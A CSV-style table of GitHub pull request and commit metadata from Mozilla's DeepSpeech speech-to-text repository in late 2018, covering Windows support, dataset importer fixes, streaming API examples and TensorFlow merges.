2582,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7efb8c7a56c41130a3b5a290b8f4c5ad560ef82,Add cmath for Windows
2583,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1dc6cc490cc90f3e0876f45452e8b406965c9ad4,Add file access defines Windows
2584,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33f5b640e44986356662c74afb1abadc6ded62fe,Add CSharp client + examples
2585,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89cc31f9cec054e40f5ff7f9796e54f413290630,Add OpenFST selects Windows
2586,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,714673ed30e6447e38faa9fca36921fc9dea82d9,Export client definitions .NET
2587,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17517cb453b090b8d129846d071824e0facd2e61,Add math defines Windows
2588,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe2963158d29bfe250cf63128c022c8883653951,Merge branch 'master' into master
2589,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1750,1750,use TrainingSpeech release 2018-11-24_fr_FR,"`2018-11-24_fr_FR` fixes many annotation issues (~500) such as empty audio etc.

@lissyx could you please take a look ?",nicolaspanel,2500584,2018-11-25T07:56:37Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08bea8480ab57f3626bb31e59a5b4876773c05ec,"use TrainingSpeech release 2018-11-24_fr_FR

`2018-11-24_fr_FR` fixes many annotation issues (~500) such as empty audio etc."
2590,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1749,1749,Issue1740+1747,,kdavis-mozilla,12054740,2018-11-24T19:34:57Z,CONTRIBUTOR,True,11,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5c9d3e88c8548df5eeb401fd7411f837412415c,Fixed #1747 (Indicate ISIP transcript version)
2591,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1749,1749,Issue1740+1747,,kdavis-mozilla,12054740,2018-11-24T19:34:57Z,CONTRIBUTOR,True,11,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81b16002b7016e10940c66a7f442fcfea6339244,Fixed #1740 (Switchboard Importer Creates WAV's at 8KHz not 16KHz)
2592,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1743,1743,Example Vad Add note about wav file format,,ghost,10137,2018-11-22T10:22:24Z,NONE,True,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdd65d6d4bcb769497eebc683549cc27e3364d45,Example Vad Add note about wav file format
2593,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8507f992c092325c8888680e8b80316e0955c765,update with changes for swb
2594,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e47e344a8272bab0426e380e161383c6f5872a5b,added downloaders and assert checks
2595,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1741,1741,changes to swb import,https://github.com/mozilla/DeepSpeech/issues/734,robmsmt,16005758,2018-11-21T05:37:50Z,CONTRIBUTOR,True,79,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4efc5c6c4d5b3b3f885492d340165a9e1e00be51,tidy pep8
2596,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1737,1737,Preprocessing: use all available threads,...the limitation to 8 threads looks a bit random to me.,engelmohr,2565120,2018-11-18T20:44:22Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,113e582b8a9b44bfff7ff6ce81a005ae9437deb1,"Preprocessing: use all available threads

...the limitation to 8 threads looks a bit random to me."
2597,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1736,1736,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's),"Unfortunately `librosa.load()` can not be called with `dtype=np.float16` or `dtype=np.int16` _and_ at the same time convert to 16KHz audio internally using `resampy`. It can only convert to 16KHz audio using `resampy` and use the default type `dtype=np.float32`. It appears as if this is a bug in `librosa.load()`.

Also, `librosa.write()` can not convert from `dtype=np.float32` to 16 bits. This is a second bug in `librosa`. The maintainer of `librosa` suggests this bug is best circumvented by using `soundfile`[[1](https://github.com/librosa/librosa/issues/361#issuecomment-220010741)], which we do. ",kdavis-mozilla,12054740,2018-11-18T17:27:20Z,CONTRIBUTOR,True,4,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c903c8b19dc763c3bddfd9f98eb23fe2ebd80af,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's)
2598,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1736,1736,Fixed #1735 (Fisher importer creates 32 not 16 bit wav's),"Unfortunately `librosa.load()` can not be called with `dtype=np.float16` or `dtype=np.int16` _and_ at the same time convert to 16KHz audio internally using `resampy`. It can only convert to 16KHz audio using `resampy` and use the default type `dtype=np.float32`. It appears as if this is a bug in `librosa.load()`.

Also, `librosa.write()` can not convert from `dtype=np.float32` to 16 bits. This is a second bug in `librosa`. The maintainer of `librosa` suggests this bug is best circumvented by using `soundfile`[[1](https://github.com/librosa/librosa/issues/361#issuecomment-220010741)], which we do. ",kdavis-mozilla,12054740,2018-11-18T17:27:20Z,CONTRIBUTOR,True,4,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba622892aafe957011ab390ae2c6f2d34af088e9,Addressed review comment
2599,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9aa23ed387439257579ac5bd9869b43ecd432248,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling)
2600,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce943dd65c73a53c024cba8be4d196e51839cc7c,Disable StepCounterHook to avoid useless warning during validation
2601,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f03669171f1563e3087999d74f26290db10a8ccd,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling)
2602,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b37f1a7aa5fbc8a3af7b71df5660d36965cad83a,Merge branch 'issue1726' of https://github.com/mozilla/DeepSpeech into issue1726
2603,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1734,1734,Fixed #1726 (Imported 8khz training audio compromised by unfiltered upsampling),,kdavis-mozilla,12054740,2018-11-17T18:31:40Z,CONTRIBUTOR,True,16,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2f967ac4ddab33fda9255990bbb734f7bbb72f2,Addressed review comments
2604,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1733,1733,Fix #1731 is_chief reference from Config,,code-R,894831,2018-11-17T17:15:14Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcee7afe57aff0063822c3682fa17ea2ed532922,Fix #1731 is_chief reference from Config
2605,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1732,1732,Disable StepCounterHook to avoid useless warning during validation (Fixes #1505),,reuben,477142,2018-11-17T16:04:01Z,MEMBER,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af0620040af7d21c3509f040cf22c848b3bb903d,Disable StepCounterHook to avoid useless warning during validation
2606,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1727,1727,Remove NodeJS v11 hack,,lissyx,1645737,2018-11-16T13:46:27Z,COLLABORATOR,True,2,77,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4867d6baa444453b0dbd10b308669836496fa0ad,Remove NodeJS v11 hack
2607,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1725,1725,missing numpy,#1724 ,robmsmt,16005758,2018-11-13T21:22:12Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6e74c17bc3ce0c4cc111d72008c4a5957b2f4f3,missing numpy
2608,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1723,1723,missing self argument,issue #1722,robmsmt,16005758,2018-11-13T16:03:52Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6e06d0642b7c680af4c50be1420176238f91834,missing self argument
2609,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1721,1721,Fix ds ctcdecoder upload,,lissyx,1645737,2018-11-13T12:57:29Z,COLLABORATOR,True,27,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbd6ea73ea16dc3beba7981666891d6cdd39c34f,Build OSX ds_ctcdecoder in separate task
2610,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1721,1721,Fix ds ctcdecoder upload,,lissyx,1645737,2018-11-13T12:57:29Z,COLLABORATOR,True,27,10,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17b7cddaba71a7e28398ac060a99c5ad26b09005,Run CTC Decoder build on merge and expose artifacts
2611,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1719,1719,Fix minor log issue on bin/import_cv.py,"Very minor change in order to log something like 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1"" - extracting archive...`` instead of 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1.tar.gz``",celian-garcia,10258608,2018-11-10T10:23:09Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9fc6c3f59bcc21a11653245a90c7689a764116cc,"Fix log issue

Very minor change in order to log something like 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1"" - extracting archive...`` instead of 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1.tar.gz"""
2612,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1718,1718,Add example for Python streaming from mic with VAD,"#1711

Think it all works, but could use someone to test, as I don't currently have a machine with both Linux and a working microphone.",daanzu,4319503,2018-11-09T15:37:34Z,CONTRIBUTOR,True,255,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,74cebb83b6da2ba619661f076e80c32a0c651b2f,Add example for Python streaming from mic with VAD
2613,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1717,1717,fix the Evaluate error - FailedPreconditionError #1691 ,fix the Evaluate error - FailedPreconditionError #1691 ,GabrielLin,9721795,2018-11-08T15:52:52Z,NONE,False,1,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01adaff7b3be83f89df822a6d44f8c68e61843bb,fix the issue of Evaluate error - FailedPreconditionError (see above for traceback): sequence_length(0) <= xxx
2614,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1716,1716,Adding streaming API Support to the GUI Tool,"#1711 
@kdavis-mozilla Up for review :)",b-ak,4998776,2018-11-08T13:51:17Z,CONTRIBUTOR,True,249,93,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,851fb4ea900b17fc2993a83b606879a210ced86e,"Adding streaming API Support to the GUI Tool

Changes:
1. Added streaming API support to the GUI tool
2. Minor modifciations to how models are loaded upon repeated transcriptions
3. Updated to Deepspeech v0.3.0
4. Image in the documentation changed

Changes v2:
1. Added streaming support to cmd interface also"
2615,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1715,1715,Check for transcript & alphabet mis-match,"(1) added error message to text.py when the transcripts and alphabet.txt file dont match, and 
(2) a script to find the unique character set from the {train/dev/test} csv files",JRMeyer,8389864,2018-11-07T18:08:47Z,CONTRIBUTOR,True,58,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a8f88d9227be974a904f9dde25670c728204e96,"added error message to text.py when the transcripts and alphabet.txt file dont match, and a file to find the unique character set from the {train/dev/test} csv files"
2616,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1715,1715,Check for transcript & alphabet mis-match,"(1) added error message to text.py when the transcripts and alphabet.txt file dont match, and 
(2) a script to find the unique character set from the {train/dev/test} csv files",JRMeyer,8389864,2018-11-07T18:08:47Z,CONTRIBUTOR,True,58,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c274d4f62990519b4ffb8a8de288c4003262605,"reubens comments, kept newlines because prettier"
2617,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1713,1713,Fix typo exporting the wrong tensor for TFLite model,,lissyx,1645737,2018-11-07T15:53:56Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6642da05baa2a461ef0943d1ccaa2cdfd91c7ba,Fix typo exporting the wrong tensor for TFLite model
2618,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9d973a191fb0b15721b0847b18ad9c14905ee61,Create tf-master branch as WIP DeepSpeech against TensorFlow master
2619,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d28266e3555dfabab9c2da7331dcb45d71557748,Update AOT AllocMode
2620,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc4bffde6ccbeed98875dd9399df21942e0ce4de,Update TensorFlow pip requirements
2621,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1f856dadc6fcd9cd2d408eb4ebb70e68449f9e,Update AOT build with TensorFlow master
2622,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f16af70cb170366aa66522c090b9d066c7333c2,"Merge pull request #1220 from lissyx/merge-tf-master_20180208

Merge tf master 20180208"
2623,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c71120fb319368641b074c80c48bf87ca93f3a16,Merge remote-tracking branch 'upstream/master' into update-tf-master
2624,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60084bab135b11713204f4d97ace06d83c5fd4f4,"Merge pull request #1230 from lissyx/update-tf-master

Update tf master"
2625,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fbf864122a23b772f37ffcbdec6fbfa4374289,Merge remote-tracking branch 'upstream/master' into update-tf-master
2626,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24e6b0f584306d051c1a619146dc1da2d5507403,Merge remote-tracking branch 'upstream/master' into update-tf-master
2627,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60ef348587a3f3c4b28cf8f23685ed5dd77e5090,Merge remote-tracking branch 'upstream/master' into update-tf-master
2628,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f939a3440b59481b4cd7e8f619f7acf534de3017,"Merge pull request #1252 from lissyx/update-tf-master

Update tf master"
2629,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1342dc8fb7a43911e1a6bce52b38e8ef800acce2,Merge remote-tracking branch 'upstream/master' into sync-master
2630,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0372af50c2882c0fafdb9d4b94ff794e45368b4,Use proper convert_graphdef tool from master
2631,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ee1e9eea707fd2db65930f4093dec9fe8f90760,Update deps to 1.6.0-rc1
2632,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de465b2b7f4f0e2e21efa332954f20086aeed1e,Switch to new TensorFlow master
2633,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,440eed476581a04d5dae622fe21faa5f4396e7d4,"Merge pull request #1255 from lissyx/sync-master

Sync master"
2634,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f2306bef1806fa1df3475a7b2aa53e77767dea3,Merge remote-tracking branch 'upstream/master' into update-tf-master
2635,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c07e3470ba8eaff61ea0f4ec0b5a9a772e57b2a2,Update TF
2636,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7454cef4aea4f4c3d73102c1ddd98b1b4ea625eb,"Merge pull request #1263 from lissyx/update-tf-master

Update tf master"
2637,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4d343bb81ed13c1c1941965385251cc98386f7d,Merge remote-tracking branch 'upstream/master' into update-tf-master
2638,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddb065d63efb3fc4c812833f23af8c0f2074c642,"Merge pull request #1280 from lissyx/update-tf-master

Update tf master"
2639,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1712,1712,#1711 - Add Python example showing use of streaming API,I will push in patches for review to handle Issue #1711 ,b-ak,4998776,2018-11-06T18:30:03Z,CONTRIBUTOR,False,38,38,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8daf3a3eae0eadf08c65c01aab81187ba60ad060,Merge remote-tracking branch 'upstream/master' into update-tf-master
